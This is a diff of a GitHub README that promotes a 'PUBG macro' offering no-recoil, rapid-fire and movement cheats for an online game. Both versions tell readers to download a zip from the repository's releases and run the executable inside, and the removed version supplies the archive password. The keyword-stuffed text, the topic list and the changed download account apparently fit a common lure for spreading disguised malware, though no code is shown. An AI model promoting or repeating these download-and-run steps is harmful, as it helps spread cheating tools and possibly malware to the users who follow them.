@@ -1,24 +1,128 @@
-🔥 ALL MOUSE AI AUTOMATIC MACRO FOR PUBG 🔥
+# PUBG Macro for All Mouse - Optimize Your Gameplay 🎮🖱️
 
-![1](https://github.com/user-attachments/assets/c37228f7-fdd7-4991-bf59-22d761832afa)
-![2](https://github.com/user-attachments/assets/bd317244-ed84-4b1f-ba4c-b580681f4e23)
+![PUBG Macro](https://img.shields.io/badge/PUBG_Macro_for_All_Mouse-v1.0-brightgreen)
 
-### DESCRIPTION
-This product is not software, it is a simple macro that is not embedded in the game. It is suitable for any mouse model, and it also has a large number of settings! The most important feature of this script is its safety in use.
+Welcome to the **PUBG Macro for All Mouse** repository! This project provides macros suitable for any mouse model, enhancing your gameplay experience in PlayerUnknown's Battlegrounds (PUBG). With a wide range of settings, you can customize your macros to fit your play style perfectly.
 
-### FEATURES
-1) Support for any mouse - it doesn't matter what mouse you play on, because this macro for PUBG | PUBG will work on absolutely any. be it a simple office or gaming mouse from popular manufacturers such as A4TechBloody. Logitech, Razer, Corsair etc.
-2) Auto-tuning - the program has a function that will perform all the necessary settings for you according to your parameters with one click.
-3) Auto-detect sights and modules - the macro will automatically recognize any sight or module attached to your weapon. Also works on any resolution, aspect ratio, graphics and gamma settings.
-4) Position Detection - As you know, each weapon and each position (sitting, standing, lying) has a completely different recoil. The macro, using AI, automatically detects what position you are in and adjusts its recoil control for each weapon.
-5) Recognition of shooting modes - from the hip, from the shoulder and from the sight, the macro will automatically determine which shooting mode you are in and adjust the recoil control for each weapon.
-6) Memorizing attachments — When switching weapons, the macro will remember all attachments. which were worn on your weapon.
-7) Combining scopes and modules - You can combine any scope with any module on any weapon. because the macro will adjust to your choice.
-8) Any sensitivity — you can set any sensitivity settings. which you like to play on.
-9) Menu — you can change each setting in a user-friendly graphical interface.
-10) Chinese, English, Russian version of the menu.
+## Features 🌟
 
-## How to Use
-1. **Download last release:** (https://github.com/Miniquenet/PUBG-MACRO-FOR-ALL-MOUSE/releases/download/latest/PubgMacro.zip).
-2. **Unzip the Files**: Use the pass **PubgMacro**.
-3. **Run the Application**: Open the menu by opening the Exe
+- **Universal Compatibility**: Works with any mouse model.
+- **Extensive Macro Library**: Access a large number of pre-configured macros for PUBG.
+- **Easy to Use**: Simple setup and execution process.
+- **Customizable Settings**: Tailor the macros to suit your preferences.
+
+## Getting Started 🚀
+
+To get started with the PUBG Macro for All Mouse, follow these steps:
+
+1. **Download the Macro**: Visit the [Releases section](https://github.com/Tribalchief-star/PUBG-MACRO-FOR-ALL-MOUSE/releases) to download the latest version of the macro file.
+2. **Execute the File**: After downloading, run the macro file on your PC.
+3. **Configure Your Settings**: Open the macro settings to adjust parameters to your liking.
+4. **Start Playing**: Launch PUBG and enjoy your optimized gameplay.
+
+## Installation Instructions 📥
+
+1. **Download the Latest Release**:
+   - Go to the [Releases section](https://github.com/Tribalchief-star/PUBG-MACRO-FOR-ALL-MOUSE/releases).
+   - Choose the latest version and download the macro file.
+
+2. **Extract the Files**:
+   - Unzip the downloaded file to a folder on your PC.
+
+3. **Run the Macro**:
+   - Locate the executable file in the extracted folder.
+   - Double-click the file to run the macro.
+
+4. **Configure Your Mouse Settings**:
+   - Open the macro configuration tool.
+   - Adjust the settings based on your preferences.
+
+5. **Launch PUBG**:
+   - Start the game and enjoy the benefits of your new macros.
+
+## Usage Guide 📖
+
+Once you have set up the macro, follow these guidelines for optimal use:
+
+- **Select the Right Macro**: Choose the macro that best fits your gameplay style. 
+- **Adjust Sensitivity**: Ensure your mouse sensitivity settings are compatible with the macro for the best results.
+- **Practice**: Spend some time practicing with the macros to get used to their behavior.
+
+## Macros Available 📊
+
+The repository includes various macros tailored for different gameplay aspects in PUBG:
+
+- **No Recoil Macros**: Reduce or eliminate recoil when firing weapons.
+- **Rapid Fire Macros**: Increase your firing rate without compromising accuracy.
+- **Movement Macros**: Enhance your movement speed and agility in the game.
+
+## Supported Mouse Models 🖱️
+
+This macro is designed to work with any mouse model, including but not limited to:
+
+- Logitech
+- Razer
+- Corsair
+- SteelSeries
+- HyperX
+
+## Troubleshooting 🛠️
+
+If you encounter issues while using the macro, consider the following steps:
+
+1. **Check Compatibility**: Ensure your mouse model is supported.
+2. **Reinstall the Macro**: Sometimes, a fresh installation can resolve issues.
+3. **Adjust Settings**: Tweak the macro settings to better fit your mouse sensitivity.
+
+If problems persist, check the "Issues" section of the repository for solutions or to report new issues.
+
+## Contributing 🤝
+
+We welcome contributions from the community! If you have ideas for new macros or improvements, please follow these steps:
+
+1. **Fork the Repository**: Create a copy of the repository on your GitHub account.
+2. **Make Changes**: Implement your changes in your forked version.
+3. **Submit a Pull Request**: Share your improvements with the community by submitting a pull request.
+
+## License 📜
+
+This project is licensed under the MIT License. You can use, modify, and distribute the code as long as you include the original license.
+
+## Topics Covered 📚
+
+This repository includes a variety of topics related to macros and PUBG:
+
+- ai-macro
+- auto-macro
+- automatic-macro
+- automatic-macro-pubg
+- free-macro-for-pubg
+- free-macro-pubg-2025
+- logitech
+- macro
+- macro-pubg-2025
+- macros
+- mouse
+- playerunknown-s-battlegrounds
+- pubg
+- pubg-free-norecoil
+- pubg-free-norecoil-2025
+
+## Community Support 💬
+
+Join our community for support and discussion about PUBG macros:
+
+- **Discord**: Join our Discord server for real-time support and chat with other users.
+- **Forums**: Participate in discussions on gaming forums dedicated to PUBG.
+
+## Contact Us 📧
+
+For any inquiries or feedback, feel free to reach out via the issues section or contact the repository owner directly.
+
+## Acknowledgments 🙏
+
+Thank you to everyone who contributed to this project. Your support helps us improve and provide better tools for the gaming community.
+
+## Final Notes 📝
+
+Make sure to keep an eye on the [Releases section](https://github.com/Tribalchief-star/PUBG-MACRO-FOR-ALL-MOUSE/releases) for updates and new features. Your feedback is essential in making this project better. Enjoy your enhanced PUBG experience with our macros!
